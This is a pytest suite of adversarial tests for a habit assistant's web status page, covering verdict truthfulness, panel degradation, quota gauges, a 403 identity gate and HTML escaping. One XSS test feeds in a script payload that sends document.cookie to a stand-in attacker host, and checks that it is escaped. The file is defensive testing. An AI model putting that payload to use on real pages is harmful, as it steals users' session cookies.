"""Vera's own adversarial probes for SPEC-LINE-PORTAL.md module STATUS
(AC8-AC14), independent of Luna's own `tests/test_portal_status.py` (35
tests -- read that file first; this one exists to hunt the failure mode
that matters most for a read-only morning-glance status page: a wrong
"healthy" verdict.

Dispatch focus (Archi's note): the VERDICT precedence/truthfulness
(UX.md "The verdict, precisely" table) hardest of all -- a FALSE-HEALTHY
hunt across every single-cause state and every worst-of combination,
per-panel degradation with the OTHER three panels proven still intact,
webhook-recency boundaries, quota-gauge parity with `core/portal/
quota.py` (structural, since both pages read the same push-ledger data
and are supposed to render the same numbers), the identity-gate 403's
zero-data-leak contract, XSS on ring-buffer content and (Windows-legal)
backup filenames, and bilingual empty-state combinations.

Same on-disk-SQLite, no-DB-mock conventions as `tests/test_portal_
status.py`. Fixtures are duplicated locally (not imported) per this
codebase's own `*_gaps.py` convention (see e.g. `tests/test_v19_grace_
gaps.py`'s docstring) -- these files are meant to stand alone.
"""

from __future__ import annotations

import logging
import re
from datetime import datetime, timedelta
from types import SimpleNamespace

import pytest
from aiohttp.test_utils import TestClient, TestServer

from habit_assistant import __version__
from habit_assistant.config import Config
from habit_assistant.core.portal import quota, status
from habit_assistant.core.portal.security import FORBIDDEN_BODY
from habit_assistant.core.portal.server import PortalDeps, PortalServer
from habit_assistant.core.portal.stats import RingBufferHandler, RuntimeStats
from habit_assistant.storage.db import Database

OWNER = "Uowner00000000000000000000000000"


# ===========================================================================
# Fixtures / helpers (mirrors tests/test_portal_status.py's own shapes).
# ===========================================================================


@pytest.fixture
def db(tmp_path):
    database = Database(tmp_path / "habits.db")
    yield database
    database.close()


def _config(tmp_path, db_path, **overrides):
    base = {
        "portal": {"enabled": True, "bind_port": 9501},
        "channel": {"type": "line"},
        "app": {"db_path": str(db_path)},
        "line": {"media_dir": str(tmp_path / "media")},
        "backup": {"dir": str(tmp_path / "backups")},
    }
    for key, value in overrides.items():
        base[key] = {**base.get(key, {}), **value}
    return Config.model_validate(base)


def _deps(db_obj, config, *, scheduler=None, stats=None, ring=None, owner=OWNER) -> PortalDeps:
    return PortalDeps(
        db=db_obj,
        config=config,
        scheduler=scheduler if scheduler is not None else SimpleNamespace(get_jobs=lambda: []),
        channel=SimpleNamespace(),
        stats=stats if stats is not None else RuntimeStats(),
        ring=ring if ring is not None else RingBufferHandler(200),
        owner_id=owner,
    )


@pytest.fixture
async def client_factory():
    clients: list[TestClient] = []

    async def make(deps: PortalDeps, modules=None) -> TestClient:
        server = PortalServer(
            bind_host="127.0.0.1",
            bind_port=0,
            deps=deps,
            modules=modules if modules is not None else [status.register],
        )
        client = TestClient(TestServer(server.build_app()))
        await client.start_server()
        clients.append(client)
        return client

    yield make

    for client in clients:
        await client.close()


async def _get_status(client: TestClient, **kwargs) -> tuple[int, str]:
    resp = await client.get("/", headers={"Tailscale-User-Login": "owner@example.com"}, **kwargs)
    return resp.status, await resp.text()


async def _get_quota(client: TestClient) -> tuple[int, str]:
    resp = await client.get("/quota", headers={"Tailscale-User-Login": "owner@example.com"})
    return resp.status, await resp.text()


def _log(ring: RingBufferHandler, level: int, name: str, msg: str) -> None:
    logger = logging.getLogger(name)
    logger.addHandler(ring)
    logger.setLevel(logging.DEBUG)
    try:
        logger.log(level, msg)
    finally:
        logger.removeHandler(ring)


def _verdict_div(body: str) -> str:
    match = re.search(r'<div class="verdict.*?</div>', body, re.DOTALL)
    assert match is not None, "no <div class=\"verdict...\"> found in the page"
    return match.group(0)


def _job(job_id: str, next_run_time) -> SimpleNamespace:
    return SimpleNamespace(id=job_id, next_run_time=next_run_time)


def _raising(name: str = "boom"):
    def _fn(*_a, **_k):
        raise RuntimeError(f"simulated {name} failure")

    return _fn


class _RaisingAttrDB:
    """Wraps a REAL `Database`, making exactly one named method raise --
    every other call (get_user, list_users, ...) still hits the real
    on-disk DB, so unrelated shared-surface reads (nav pending-count, the
    owner's language pref) are unaffected. Same technique `tests/test_
    portal_status.py::test_ac12_gauge_read_failure_...`'s own `_BoomDB`
    uses, generalized to any one attribute."""

    def __init__(self, real, boom_attr: str):
        self._real = real
        self._boom_attr = boom_attr

    def __getattr__(self, name):
        if name == self._boom_attr:
            return _raising(name)
        return getattr(self._real, name)


class _RecordsBoomRing:
    """A ring buffer whose `len()`/`at_capacity()`/`capacity` all work
    normally, but `.records()` -- the one call that actually reads the
    stored log rows -- raises. Probes whether a read failure DEEPER than
    the `len()` check still correctly demotes the verdict (it must: the
    `except` in `_handle_status` resets `ring_nonempty` but still appends
    to `panel_failures`)."""

    def __init__(self, real: RingBufferHandler):
        self._real = real

    def __len__(self):
        return len(self._real)

    def records(self):
        raise RuntimeError("simulated ring records() failure")

    def at_capacity(self):
        return self._real.at_capacity()

    @property
    def capacity(self):
        return self._real.capacity


class _LenBoomRing:
    """`__len__` itself raises -- the EARLIEST possible failure point in
    the errors-panel try block (`ring_nonempty = len(deps.ring) > 0` is
    the very first line inside it)."""

    def __len__(self):
        raise RuntimeError("simulated ring len() failure")

    def records(self):
        raise RuntimeError("simulated ring records() failure")

    def at_capacity(self):
        raise RuntimeError("simulated ring at_capacity() failure")

    @property
    def capacity(self):
        return 200


# ===========================================================================
# 1. VERDICT TRUTHFULNESS -- single-cause matrix (UX.md "The verdict,
#    precisely" table, every row).
# ===========================================================================


async def test_matrix_dead_scheduler_job_alone_is_stop(tmp_path, db, client_factory):
    scheduler = SimpleNamespace(get_jobs=lambda: [_job("daily_digest", None)])
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    deps = _deps(db, config, scheduler=scheduler)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "verdict stop" in _verdict_div(body)


async def test_matrix_quota_at_100_percent_alone_is_stop(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", digest={"mode": "digest", "warn_cap": 50}, i18n={"language": "en"})
    for _ in range(50):
        db.increment_push("Ua", datetime.now().strftime("%Y-%m"))
    deps = _deps(db, config)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "verdict stop" in _verdict_div(body)


async def test_matrix_quota_at_80_percent_alone_is_warn(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", digest={"mode": "digest", "warn_cap": 100}, i18n={"language": "en"})
    for _ in range(80):
        db.increment_push("Ua", datetime.now().strftime("%Y-%m"))
    deps = _deps(db, config)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "verdict warn" in _verdict_div(body)


async def test_matrix_ring_buffer_nonempty_alone_is_warn(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    ring = RingBufferHandler(200)
    _log(ring, logging.WARNING, "habit_assistant.x", "a lone warning")
    deps = _deps(db, config, ring=ring)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "verdict warn" in _verdict_div(body)


async def test_matrix_scheduler_read_exception_alone_is_warn_not_lost(tmp_path, db, client_factory):
    """GAP: Luna's own suite tests a DEAD job (`next_run_time=None`) but
    never a `scheduler.get_jobs()` call that RAISES outright -- a
    different failure class the spec's own §3.3 explicitly names ("a
    per-panel data read that raises"). Must still be a warn, not silently
    swallowed into "All good"."""
    scheduler = SimpleNamespace(get_jobs=_raising("scheduler.get_jobs"))
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    deps = _deps(db, config, scheduler=scheduler)
    client = await client_factory(deps)
    status_code, body = await _get_status(client)
    assert status_code == 200
    assert "read this right now." in body
    assert "verdict warn" in _verdict_div(body)
    assert '<a href="#jobs">Scheduler</a>' in _verdict_div(body)


async def test_matrix_errors_panel_records_exception_alone_is_warn_not_lost(tmp_path, db, client_factory):
    """GAP: the errors panel's `.records()` raising (as opposed to an
    empty/populated buffer) is never exercised by Luna's suite. This is
    exactly the false-healthy shape the dispatch note calls out: a broken
    READ of the ring buffer must not look like an EMPTY (good) ring
    buffer."""
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    real_ring = RingBufferHandler(200)  # left empty on purpose -- see docstring
    deps = _deps(db, config, ring=_RecordsBoomRing(real_ring))
    client = await client_factory(deps)
    status_code, body = await _get_status(client)
    assert status_code == 200
    assert "read this right now." in body
    assert "verdict warn" in _verdict_div(body)
    assert '<a href="#errors">Recent errors</a>' in _verdict_div(body)
    # And it must NOT render as the (wrong) "no errors" affirmative empty state:
    assert "No errors since the service started" not in body


async def test_matrix_errors_panel_len_exception_alone_is_warn_not_lost(tmp_path, db, client_factory):
    """Same hunt, one call earlier: `len(deps.ring)` itself raises before
    `.records()` is ever reached."""
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    deps = _deps(db, config, ring=_LenBoomRing())
    client = await client_factory(deps)
    status_code, body = await _get_status(client)
    assert status_code == 200
    assert "verdict warn" in _verdict_div(body)
    assert '<a href="#errors">Recent errors</a>' in _verdict_div(body)


# ===========================================================================
# 2. WORST-OF PRECEDENCE -- multiple simultaneous triggers.
# ===========================================================================


async def test_precedence_two_stop_causes_named_together(tmp_path, db, client_factory):
    scheduler = SimpleNamespace(get_jobs=lambda: [_job("job_a", None), _job("job_b", None)])
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    deps = _deps(db, config, scheduler=scheduler)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    verdict = _verdict_div(body)
    assert "verdict stop" in verdict
    assert "2 things to check" in verdict
    assert '<li><a href="#jobs">job_a' in verdict
    assert '<li><a href="#jobs">job_b' in verdict


async def test_precedence_stop_hides_warn_cause_when_quota_stopped_and_ring_nonempty(tmp_path, db, client_factory):
    """Quota AT the cap (stop) simultaneously with a populated ring buffer
    (warn): the banner must show ONLY the stop cause. The ring buffer's
    own panel still shows the real warning further down the page -- it
    just isn't named in the TOP banner once a worse tier wins (UX.md:
    "only THAT tier's causes are named")."""
    config = _config(tmp_path, tmp_path / "habits.db", digest={"mode": "digest", "warn_cap": 10}, i18n={"language": "en"})
    for _ in range(10):
        db.increment_push("Ua", datetime.now().strftime("%Y-%m"))
    ring = RingBufferHandler(200)
    _log(ring, logging.WARNING, "habit_assistant.x", "a background warning")
    deps = _deps(db, config, ring=ring)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    verdict = _verdict_div(body)
    assert "verdict stop" in verdict
    assert "#errors" not in verdict
    # The warning is still visible in its OWN panel, just not in the banner:
    assert "a background warning" in body


async def test_precedence_three_warn_causes_multi_count(tmp_path, db, client_factory):
    missing_db_path = tmp_path / "does-not-exist.db"
    config = _config(tmp_path, missing_db_path, digest={"mode": "digest", "warn_cap": 100}, i18n={"language": "en"})
    for _ in range(85):
        db.increment_push("Ua", datetime.now().strftime("%Y-%m"))
    ring = RingBufferHandler(200)
    _log(ring, logging.WARNING, "habit_assistant.x", "a warning")
    deps = _deps(db, config, ring=ring)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    verdict = _verdict_div(body)
    assert "verdict warn" in verdict
    assert "3 things to check" in verdict
    assert '<a href="#errors">' in verdict
    assert '<a href="/quota">' in verdict
    assert '<a href="#storage">' in verdict


# ===========================================================================
# 3. FALSE-HEALTHY HUNT -- combinations, plus the two documented
#    non-drivers (last-webhook staleness, backup staleness/absence).
# ===========================================================================


async def test_false_healthy_kitchen_sink_all_four_panels_fail_at_once(tmp_path, db, client_factory):
    """The hardest version of the hunt: every one of the four data
    sources (scheduler, storage, quota, errors) fails to read
    SIMULTANEOUSLY. If any short-circuit in `_compute_verdict` silently
    drops a cause, this is where it would show up as a missing count."""
    scheduler = SimpleNamespace(get_jobs=_raising("scheduler"))
    missing_db_path = tmp_path / "does-not-exist.db"
    config = _config(tmp_path, missing_db_path, i18n={"language": "en"})
    boom_db = _RaisingAttrDB(db, "monthly_push_total")
    ring = _RecordsBoomRing(RingBufferHandler(200))
    deps = _deps(boom_db, config, scheduler=scheduler, ring=ring)
    client = await client_factory(deps)
    status_code, body = await _get_status(client)
    assert status_code == 200  # never a 500, even in total-degradation
    verdict = _verdict_div(body)
    assert "verdict warn" in verdict
    assert "4 things to check" in verdict
    assert body.count("read this right now.") == 4
    for href in ('href="#jobs"', 'href="#storage"', 'href="/quota"', 'href="#errors"'):
        assert href in verdict


async def test_false_healthy_stale_last_webhook_event_does_not_drive_verdict(tmp_path, db, client_factory):
    """UX.md Flow A, explicit: "Last webhook event staleness... deliberately
    does NOT drive the verdict." Pinning it: even a 30-day-old last event,
    with nothing else wrong, must still read 'All good'."""
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    stats = RuntimeStats()
    stats.last_event_at = datetime.now() - timedelta(days=30)
    deps = _deps(db, config, stats=stats)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert '<div class="verdict ok">' in body
    assert "30 days ago" in body  # informational tile still shows it


async def test_false_healthy_missing_backups_does_not_drive_verdict(tmp_path, db, client_factory):
    """Backup presence/staleness is NOT in UX.md's verdict-trigger table
    (only ring buffer / panel-read-failure / quota% / dead job are). A
    fresh install with zero backups ever taken must still read 'All
    good', not a silent warn an over-eager implementation might have
    added."""
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    deps = _deps(db, config)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert '<div class="verdict ok">' in body
    assert "No backups yet" in body


# ===========================================================================
# 4. PER-PANEL DEGRADATION -- the failing panel shows unavailable, the
#    OTHER THREE data-bearing panels stay genuinely intact (not just "the
#    page didn't crash").
# ===========================================================================


def _healthy_scheduler():
    return SimpleNamespace(get_jobs=lambda: [_job("minutely_tick", datetime.now() + timedelta(seconds=30))])


async def test_degradation_scheduler_fails_storage_and_gauge_and_errors_stay_real(tmp_path, db, client_factory):
    backup_dir = tmp_path / "backups"
    backup_dir.mkdir()
    (backup_dir / "habits-20260830T030000-000000.db").write_bytes(b"x" * 1024)
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    for _ in range(5):
        db.increment_push("Ua", datetime.now().strftime("%Y-%m"))
    scheduler = SimpleNamespace(get_jobs=_raising("scheduler"))
    deps = _deps(db, config, scheduler=scheduler)
    client = await client_factory(deps)
    status_code, body = await _get_status(client)
    assert status_code == 200
    assert body.count("read this right now.") == 1  # only the scheduler panel
    assert "habits-20260830T030000-000000.db" in body  # storage: real
    assert "5 / 280" in body  # gauge: real, default digest mode -> warn_cap
    assert "No errors since the service started" in body  # errors: real (empty, healthy)
    verdict = _verdict_div(body)
    assert "verdict warn" in verdict
    assert "things to check" not in verdict  # exactly ONE cause -- no multi-count wrapper


async def test_degradation_storage_fails_scheduler_and_gauge_and_errors_stay_real(tmp_path, db, client_factory):
    missing_db_path = tmp_path / "does-not-exist.db"
    config = _config(tmp_path, missing_db_path, i18n={"language": "en"})
    for _ in range(5):
        db.increment_push("Ua", datetime.now().strftime("%Y-%m"))
    deps = _deps(db, config, scheduler=_healthy_scheduler())
    client = await client_factory(deps)
    status_code, body = await _get_status(client)
    assert status_code == 200
    assert body.count("read this right now.") == 1
    assert "minutely_tick" in body
    assert "5 / 280" in body  # default digest mode -> warn_cap, not push_cap
    assert "No errors since the service started" in body
    verdict = _verdict_div(body)
    assert "verdict warn" in verdict
    assert '<a href="#storage">Storage</a>' in verdict


async def test_degradation_gauge_fails_scheduler_and_storage_and_errors_stay_real(tmp_path, db, client_factory):
    backup_dir = tmp_path / "backups"
    backup_dir.mkdir()
    (backup_dir / "habits-20260830T030000-000000.db").write_bytes(b"x" * 1024)
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    boom_db = _RaisingAttrDB(db, "monthly_push_total")
    deps = _deps(boom_db, config, scheduler=_healthy_scheduler())
    client = await client_factory(deps)
    status_code, body = await _get_status(client)
    assert status_code == 200
    assert body.count("read this right now.") == 1
    assert "minutely_tick" in body
    assert "habits-20260830T030000-000000.db" in body
    assert "No errors since the service started" in body
    verdict = _verdict_div(body)
    assert "verdict warn" in verdict
    assert '<a href="/quota">Quota</a>' in verdict


async def test_degradation_errors_fails_scheduler_and_storage_and_gauge_stay_real(tmp_path, db, client_factory):
    backup_dir = tmp_path / "backups"
    backup_dir.mkdir()
    (backup_dir / "habits-20260830T030000-000000.db").write_bytes(b"x" * 1024)
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    for _ in range(5):
        db.increment_push("Ua", datetime.now().strftime("%Y-%m"))
    real_ring = RingBufferHandler(200)
    deps = _deps(db, config, scheduler=_healthy_scheduler(), ring=_RecordsBoomRing(real_ring))
    client = await client_factory(deps)
    status_code, body = await _get_status(client)
    assert status_code == 200
    assert body.count("read this right now.") == 1
    assert "minutely_tick" in body
    assert "habits-20260830T030000-000000.db" in body
    assert "5 / 280" in body  # default digest mode -> warn_cap, not push_cap
    verdict = _verdict_div(body)
    assert "verdict warn" in verdict
    assert '<a href="#errors">Recent errors</a>' in verdict


# ===========================================================================
# 5. QUOTA GAUGE BOUNDARY PRECISION.
# ===========================================================================


async def test_gauge_boundary_79_percent_is_ok_not_warn(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", digest={"mode": "digest", "warn_cap": 100}, i18n={"language": "en"})
    for _ in range(79):
        db.increment_push("Ua", datetime.now().strftime("%Y-%m"))
    deps = _deps(db, config)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "panel gauge ok" in body
    assert '<div class="verdict ok">' in body


async def test_gauge_boundary_99_percent_is_warn_not_stop(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", digest={"mode": "digest", "warn_cap": 100}, i18n={"language": "en"})
    for _ in range(99):
        db.increment_push("Ua", datetime.now().strftime("%Y-%m"))
    deps = _deps(db, config)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "panel gauge warn" in body
    assert "verdict warn" in _verdict_div(body)


async def test_gauge_over_100_percent_shows_real_overage_text_bar_still_clamped(tmp_path, db, client_factory):
    """Truthfulness check on overage: the DECORATIVE bar is allowed to
    clamp visually at 100%, but the TEXT line -- the accessible source of
    truth per UI.md §3.7 -- must show the real, uncapped number. A gauge
    that silently reported "100%" when the real figure is 105% would be
    exactly the kind of lie a status page must not tell."""
    config = _config(tmp_path, tmp_path / "habits.db", digest={"mode": "digest", "warn_cap": 100}, i18n={"language": "en"})
    for _ in range(105):
        db.increment_push("Ua", datetime.now().strftime("%Y-%m"))
    deps = _deps(db, config)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "105 / 100 (105%)" in body  # real, uncapped truth
    assert 'style="width:100.0%"' in body  # decorative bar clamped
    assert "panel gauge stop" in body


# ===========================================================================
# 6. QUOTA GAUGE PARITY with core/portal/quota.py (structural check).
# ===========================================================================


async def test_gauge_db_failure_shows_unavailable_not_a_fake_zero(tmp_path, db, client_factory):
    """The fail-closed contract, pinned precisely: a `monthly_push_total`
    read failure must render the "unavailable" state, NOT a fabricated
    "0 / cap (0.0%)" line that would misrepresent an unknown quota as a
    known, safe one."""
    config = _config(tmp_path, tmp_path / "habits.db", digest={"mode": "digest", "warn_cap": 100}, i18n={"language": "en"})
    boom_db = _RaisingAttrDB(db, "monthly_push_total")
    deps = _deps(boom_db, config)
    client = await client_factory(deps)
    status_code, body = await _get_status(client)
    assert status_code == 200
    assert "read this right now." in body
    assert "/ 100 (" not in body  # no fabricated used/cap/pct line anywhere
    assert "0 / 100 (0" not in body  # specifically not a fake zero


async def test_status_and_quota_pages_read_the_same_underlying_total(tmp_path, db, client_factory):
    """Structural parity: both `GET /` and `GET /quota` compute `used`
    from the SAME `db.monthly_push_total(current_yyyymm)` call and the
    SAME active-cap formula (`push_cap` in realtime mode else
    `warn_cap`) -- pushing N and reading both pages must show the same
    underlying numbers on both."""
    config = _config(tmp_path, tmp_path / "habits.db", digest={"mode": "digest", "warn_cap": 200}, i18n={"language": "en"})
    for _ in range(50):
        db.increment_push("Ua", datetime.now().strftime("%Y-%m"))
    deps = _deps(db, config)
    client = await client_factory(deps, modules=[status.register, quota.register])

    _, status_body = await _get_status(client)
    _, quota_body = await _get_quota(client)

    assert "50 / 200" in status_body
    assert "50 / 200" in quota_body


async def test_status_and_quota_percent_formatting_now_matches_on_round_numbers(tmp_path, db, client_factory):
    """FLIPPED (integration pass, item 6, TEST-PORTAL-status.md Finding 1):
    `status.py`'s gauge and `core/portal/quota.py:_render_gauge` both now
    call the SAME shared `layout.format_pct` helper (promoted from
    `status.py`'s own former private `_format_pct`) instead of each
    formatting independently -- at a round percentage, both pages now
    render the IDENTICAL trimmed string for the identical used/cap/mode."""
    config = _config(tmp_path, tmp_path / "habits.db", digest={"mode": "digest", "warn_cap": 100}, i18n={"language": "en"})
    for _ in range(80):
        db.increment_push("Ua", datetime.now().strftime("%Y-%m"))
    deps = _deps(db, config)
    client = await client_factory(deps, modules=[status.register, quota.register])

    _, status_body = await _get_status(client)
    _, quota_body = await _get_quota(client)

    assert "80 / 100 (80%)" in status_body  # trimmed
    assert "80 / 100 (80%)" in quota_body  # now ALSO trimmed -- the fix
    assert "80 / 100 (80.0%)" not in quota_body


# ===========================================================================
# 7. IDENTITY GATE -- header-less / wrong-owner GET / is 403, ZERO data.
# ===========================================================================


async def test_headerless_get_status_is_403_with_zero_data_leak(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db")
    deps = _deps(db, config)
    client = await client_factory(deps)
    resp = await client.get("/")  # no Tailscale-User-Login header at all
    assert resp.status == 403
    body = await resp.text()
    assert body == FORBIDDEN_BODY  # byte-identical to the shared, unstyled 403
    assert __version__ not in body
    assert "verdict" not in body
    assert "Habit Assistant" not in body  # BRAND string absent
    assert "<nav>" not in body


async def test_wrong_owner_login_get_status_is_403_with_zero_data_leak(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", portal={"owner_login": "owner@example.com"})
    deps = _deps(db, config)
    client = await client_factory(deps)
    resp = await client.get("/", headers={"Tailscale-User-Login": "intruder@example.com"})
    assert resp.status == 403
    body = await resp.text()
    assert body == FORBIDDEN_BODY
    assert __version__ not in body


# ===========================================================================
# 8. XSS -- ring-buffer entries with markup (realistic exception-message
#    shape, embedding "user text"), hostile logger names, hostile backup
#    filenames (Windows-legal characters only -- `<>:"/\|?*` cannot exist
#    in a real Windows filename, so `&`/`'` are this platform's actual
#    adversarial-filename surface).
# ===========================================================================


async def test_realistic_exception_message_with_embedded_hostile_user_text_is_escaped(tmp_path, db, client_factory):
    """Mirrors a real failure shape: an exception message that embeds
    attacker-influenced text (e.g. a LINE display name or chat payload
    surfacing inside a caught exception's `str()`)."""
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    ring = RingBufferHandler(200)
    hostile_name = "Bob<script>fetch('https://evil.example/'+document.cookie)</script>"
    _log(ring, logging.ERROR, "habit_assistant.channels.line", f"Push failed for user {hostile_name!r}: 429")
    deps = _deps(db, config, ring=ring)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "<script>fetch" not in body
    assert "&lt;script&gt;" in body


async def test_hostile_logger_name_is_escaped(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    ring = RingBufferHandler(200)
    _log(ring, logging.WARNING, "habit_assistant.<b>evil</b>", "some message")
    deps = _deps(db, config, ring=ring)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "<b>evil</b>" not in body
    assert "&lt;b&gt;evil&lt;/b&gt;" in body


async def test_hostile_backup_filename_windows_legal_chars_is_escaped(tmp_path, db, client_factory):
    """`<>:"/\\|?*` are illegal in a Windows filename (this test runs on
    win32) so they can never actually reach the backup directory on this
    platform -- `&` and `'` are the real adversarial surface here, and
    both are meaningful HTML metacharacters `escape()` must still
    neutralize."""
    backup_dir = tmp_path / "backups"
    backup_dir.mkdir()
    hostile_name = "habits-Q&A's_report.db"
    (backup_dir / hostile_name).write_bytes(b"x" * 100)
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    deps = _deps(db, config)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "Q&A's_report" not in body  # raw, unescaped form absent
    assert "Q&amp;A&#x27;s_report" in body


# ===========================================================================
# 9. WEBHOOK RECENCY -- boundaries and clock-source consistency.
# ===========================================================================


async def test_relative_time_just_now_under_60_seconds(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    stats = RuntimeStats()
    stats.last_event_at = datetime.now() - timedelta(seconds=30)
    deps = _deps(db, config, stats=stats)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "just now" in body


async def test_relative_time_singular_minute_boundary(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    stats = RuntimeStats()
    stats.last_event_at = datetime.now() - timedelta(seconds=65)
    deps = _deps(db, config, stats=stats)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "1 minute ago" in body


async def test_relative_time_plural_minutes_near_top_of_bucket(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    stats = RuntimeStats()
    stats.last_event_at = datetime.now() - timedelta(seconds=3550)  # 59m10s
    deps = _deps(db, config, stats=stats)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "59 minutes ago" in body


async def test_relative_time_singular_hour_boundary(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    stats = RuntimeStats()
    stats.last_event_at = datetime.now() - timedelta(seconds=3700)  # 1h1m40s
    deps = _deps(db, config, stats=stats)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "1 hour ago" in body


async def test_relative_time_plural_hours_near_top_of_bucket(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    stats = RuntimeStats()
    stats.last_event_at = datetime.now() - timedelta(seconds=85000)  # ~23h36m
    deps = _deps(db, config, stats=stats)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "23 hours ago" in body


async def test_relative_time_singular_day_boundary(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    stats = RuntimeStats()
    stats.last_event_at = datetime.now() - timedelta(seconds=90000)  # 25h
    deps = _deps(db, config, stats=stats)
    client = await client_factory(deps)
    _, body = await _get_status(client)
    assert "1 day ago" in body


async def test_uptime_future_started_at_clamps_to_zero_not_negative_or_crash(tmp_path, db, client_factory):
    """A `started_at` slightly AHEAD of "now" (two nearby `datetime.now()`
    reads inside one request, or clock skew) must not render a negative
    uptime or raise -- `_format_uptime`'s own `max(0, ...)` guard, pinned
    end-to-end through a real request."""
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    stats = RuntimeStats(started_at=datetime.now() + timedelta(seconds=30))
    deps = _deps(db, config, stats=stats)
    client = await client_factory(deps)
    status_code, body = await _get_status(client)
    assert status_code == 200
    match = re.search(r"Uptime<b>(.*?)</b>", body)
    assert match is not None
    assert match.group(1) == "0m"  # clamped, never negative


# ===========================================================================
# 10. BILINGUAL -- full empty-state combination (fresh install), both
#     languages at once.
# ===========================================================================


async def test_fresh_install_all_empty_states_together_english(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db", i18n={"language": "en"})
    deps = _deps(db, config)  # no jobs, no backups, no errors, no pending, zero pushes
    client = await client_factory(deps)
    status_code, body = await _get_status(client)
    assert status_code == 200
    assert '<div class="verdict ok">' in body
    assert "No scheduled jobs." in body
    assert "No backups yet" in body
    assert "No errors since the service started." in body
    assert "No events since the service restarted" in body
    assert 'class="needs"' not in body


async def test_fresh_install_all_empty_states_together_thai(tmp_path, db, client_factory):
    config = _config(tmp_path, tmp_path / "habits.db")  # Thai is the default
    deps = _deps(db, config)
    client = await client_factory(deps)
    status_code, body = await _get_status(client)
    assert status_code == 200
    assert '<div class="verdict ok">' in body
    assert "ไม่มีงานที่ตั้งเวลาไว้" in body
    assert "ยังไม่มีการสำรองข้อมูล" in body
    assert "ยังไม่มีข้อผิดพลาดตั้งแต่ระบบเริ่มทำงาน" in body
    assert "ยังไม่มีข้อความเข้ามาตั้งแต่ระบบเริ่มทำงาน" in body
    assert 'class="needs"' not in body
